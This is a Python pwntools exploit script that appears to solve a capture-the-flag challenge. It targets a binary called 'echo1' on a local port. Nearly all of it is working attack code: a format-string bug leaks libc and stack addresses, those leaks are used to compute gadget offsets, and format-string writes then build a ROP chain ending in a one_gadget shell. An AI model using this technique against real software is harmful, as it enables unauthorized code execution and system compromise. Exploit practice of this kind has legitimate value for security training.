#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'echo1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

# io = start()
io = remote('localhost', 31313)
io.recvline()
# pause()

# 8 addr is our string

io.send(b"%3$p %1$p\n")
leak = io.recvline().split(b" 0x")
leaklibc = int(leak[0][2:], 16) - 0x11ba61
leakstack = int(leak[1], 16) + 0x98
# leakstack 
print(hex(leaklibc))
print(hex(leakstack))
# io.send(b"%p"*16)
one_gadget = 0x583dc + leaklibc
pop_rax = 0x00000000000dd237 + leaklibc
pop_rbx = 0x00000000000586d4 + leaklibc

pause()
pl = fmtstr_payload(8, {leakstack: pop_rax}) # , leakstack+0x20: one_gadget})
print(len(pl))
io.send(pl)
pause(1)
io.send(fmtstr_payload(8, {leakstack+8: 0x0}))
pause(1)
io.send(fmtstr_payload(8, {leakstack+0x10: pop_rbx}))
pause(1)
io.send(fmtstr_payload(8, {leakstack+0x18: 0}))
pause(1)
io.send(fmtstr_payload(8, {leakstack+0x20: one_gadget}))
io.sendline()
io.interactive()


